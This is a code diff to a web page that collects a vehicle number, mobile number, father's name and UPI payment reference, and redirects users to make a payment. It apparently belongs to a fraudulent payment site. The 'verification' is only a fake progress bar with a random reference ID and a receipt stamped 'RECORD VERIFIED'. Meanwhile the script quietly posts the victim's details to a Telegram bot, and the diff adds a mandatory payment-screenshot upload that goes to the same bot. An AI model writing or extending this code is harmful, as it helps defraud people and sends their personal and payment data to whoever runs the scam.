@@ -33,7 +33,9 @@
         .ind-strip img { width: 30px; margin-bottom: 4px; }
         
         #vehInput { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; outline: none; text-transform: uppercase; width: 100%; padding-left: 70px; }
-        #mob, #fatherName, .utr-field, #promoInput { width: 100%; padding: 16px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; font-size: 18px; text-align: center; font-weight: bold; }
+        #mob, #fatherName, .utr-field, #promoInput, #screenshotInput { width: 100%; padding: 16px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; font-size: 18px; text-align: center; font-weight: bold; }
+
+        .screenshot-label { display: block; background: #fff3cd; color: #856404; padding: 10px; border-radius: 8px; margin-bottom: 5px; font-size: 14px; font-weight: bold; border: 1px dashed #856404; }
 
         .promo-section { display: flex; gap: 8px; margin-bottom: 15px; }
         #promoInput { margin-bottom: 0; flex: 1; text-transform: uppercase; }
@@ -118,6 +120,9 @@
             <input type="text" id="fatherName" placeholder="Father's Name (Optional)">
             <input type="tel" id="utr" class="utr-field" placeholder="Enter 12 Digit UTR Number" maxlength="12" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
 
+            <label class="screenshot-label">पेमेंट का स्क्रीनशॉट अपलोड करना अनिवार्य है 👇</label>
+            <input type="file" id="screenshotInput" accept="image/*">
+
             <button class="btn" onclick="submit()">Verify & Generate Receipt</button>
         </div>
     </div>
@@ -194,11 +199,14 @@
             window.location.href = upiUrl; 
         }
 
-        function submit() {
+        async function submit() {
             const m = document.getElementById('mob').value;
             const u = document.getElementById('utr').value;
+            const fileInput = document.getElementById('screenshotInput');
+
             if(m.length < 10) { alert("Invalid Mobile Number."); return; }
             if(u.length !== 12) { alert("Enter 12-digit UTR."); return; }
+            if(fileInput.files.length === 0) { alert("कृपया पेमेंट का स्क्रीनशॉट अपलोड करें!"); return; }
 
             document.getElementById('load').style.display='flex';
             let p = 0;
@@ -206,14 +214,26 @@
                 p += 2;
                 document.getElementById('pText').innerText = p + "%";
                 document.getElementById('carIcon').style.left = (p * 0.85) + "%";
+                
                 if (p === 60) {
                     const now = new Date();
                     globalTxId = "RCV" + Math.floor(Math.random() * 9000000000);
                     const dStr = now.toLocaleDateString('en-IN');
                     const tStr = now.toLocaleTimeString('en-IN');
                     
-                    let cap = `✅ *RECORD VERIFIED*\n\n🆔 *Ref:* \`${globalTxId}\`\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n🔢 *UTR:* ${u}\n💰 *Amt:* ₹${currentAmount}\n🎟️ *Promo:* ${promoUsed}`;
-                    fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage?chat_id=${T_CHAT_ID}&text=${encodeURIComponent(cap)}&parse_mode=Markdown`);
+                    let cap = `✅ *RECORD VERIFIED*\n\n📅 *Date:* ${dStr}\n⏰ *Time:* ${tStr}\n🆔 *Ref:* \`${globalTxId}\`\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n🔢 *UTR:* ${u}\n💰 *Amt:* ₹${currentAmount}\n🎟️ *Promo:* ${promoUsed}`;
+                    
+                    // Telegram Photo Upload logic
+                    const formData = new FormData();
+                    formData.append("chat_id", T_CHAT_ID);
+                    formData.append("caption", cap);
+                    formData.append("parse_mode", "Markdown");
+                    formData.append("photo", fileInput.files[0]);
+
+                    fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
                     
                     saveHistory(document.getElementById('vehInput').value, dStr, tStr);
                     
@@ -221,6 +241,7 @@
                         makePDF(dStr, tStr, globalTxId);
                     };
                 }
+                
                 if (p >= 100) {
                     clearInterval(iv);
                     document.getElementById('load').style.display='none';
@@ -251,7 +272,6 @@
             const fn = document.getElementById('fatherName').value || "N/A";
             const uNum = document.getElementById('utr').value;
 
-            // RESTORED ORIGINAL PDF FORMAT
             // Blue Header
             doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
             doc.setTextColor(255); doc.setFont("helvetica", "bold"); doc.setFontSize(22);
